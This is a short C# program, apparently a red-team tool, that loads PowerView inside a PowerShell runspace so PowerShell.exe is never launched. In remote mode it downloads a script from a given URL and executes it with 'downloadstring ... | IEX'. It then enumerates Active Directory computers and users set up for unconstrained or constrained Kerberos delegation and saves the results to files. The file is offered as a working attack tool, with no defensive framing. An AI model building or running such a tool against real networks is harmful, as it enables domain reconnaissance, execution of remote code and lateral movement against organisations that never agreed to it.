using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace PowerViewRunspaceRunner
{
    class Program
    {
        const string getUnconstrained = "Get-DomainComputer -Unconstrained";
        const string getConstrained = "Get-DomainUser -TrustedToAuth";

        private static void Helper()
        {
            Console.WriteLine("Usage: exe remote <URL:/PowerView.ps1> <FullPathToDirOutput>");
            Console.WriteLine("Usage: exe local <FullPathToPowerView.ps1> <FullPathToDirOutput>");
        }
        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Helper();
                Environment.Exit(0);
            }

            string directive = args[0];
            string outputDir = "Out-File -FilePath " + args[2];

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            if (directive.Equals("remote"))
            {
                ps.AddScript(string.Format("(new-object system.net.webclient)." +
                "downloadstring('{0}') | IEX", args[1]));
            }
            else if (directive.Equals("local"))
            {
                ps.AddScript(File.ReadAllText(args[1]));
            }
            else
            {
                Helper();
            }

            ps.AddScript(getConstrained + " | " + outputDir + "\\ConstrainedDelegation.txt");
            ps.AddScript(getUnconstrained + " | " + outputDir + "\\UnconstrainedDelegation.txt");

            ps.Invoke();
            rs.Close();

        }
    }
}
